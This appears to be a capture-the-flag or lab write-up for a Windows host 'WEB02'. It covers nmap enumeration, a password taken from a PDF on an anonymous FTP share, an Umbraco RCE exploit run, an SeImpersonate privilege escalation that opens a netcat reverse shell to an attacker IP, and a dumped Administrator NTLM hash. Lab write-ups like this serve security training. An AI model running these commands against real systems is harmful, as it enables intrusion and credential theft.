# WEB02 .247 \[W, Pwned]

## Enumeration

```
Nmap scan report for 192.168.139.247
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/8.1.10)
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.1.10
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: RELIA - New Hire Information
|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/8.1.10)
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.1.10
|_http-title: RELIA - New Hire Information
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-12-12T04:55:19+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=WEB02
| rdp-ntlm-info: 
|   Target_Name: WEB02
|_  System_Time: 2025-12-12T04:55:00+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
14020/tcp open  ftp           FileZilla ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r--r--r-- 1 ftp ftp         237639 Nov 04  2022 umbraco.pdf
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
|_ftp-bounce: bounce working!
14080/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Bad Request
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Files

umbraco.pdf

```
You can use the user account "mark" (@relia.com) for basic configuration of the Umbraco
instances on IIS servers (pass "OathDeeplyReprieve91").
IIS is configured to only allow access to Umbraco using the server FQDN at the moment.
o e.g. web02.relia.com, not just web02.
```

{% code title="http://web02.relia.com/pdfs/WelcomeLetter.pdf" %}
```
Everything else you need will be sent in a follow-up email in the coming days.
```
{% endcode %}

### Ports

80

Umbraco 7 RCE available but no path to be found for it \[diff port dummy 14080]

mark not a valid mail id so no mails to work with

### Local Users

`mark:OathDeeplyReprieve91`

rid-brute

* mark
* zachary

## Initial Foothold

```
python3 exploit.py -u "mark@relia.com" -p "OathDeeplyReprieve91" -w 'http://web02.relia.com:14080/' -i 192.168.241.247
```

## PrivEsc

'defaultapppool' SeImpersonate

```
.\GP.exe -cmd "cmd /c C:\programdata\nc64.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.167 443"
```

## Post Exploitation

```
         * Username : Administrator
         * Domain   : WEB02
         * NTLM     : 2f2b8d5d4d756a2c72c554580f970c14
```
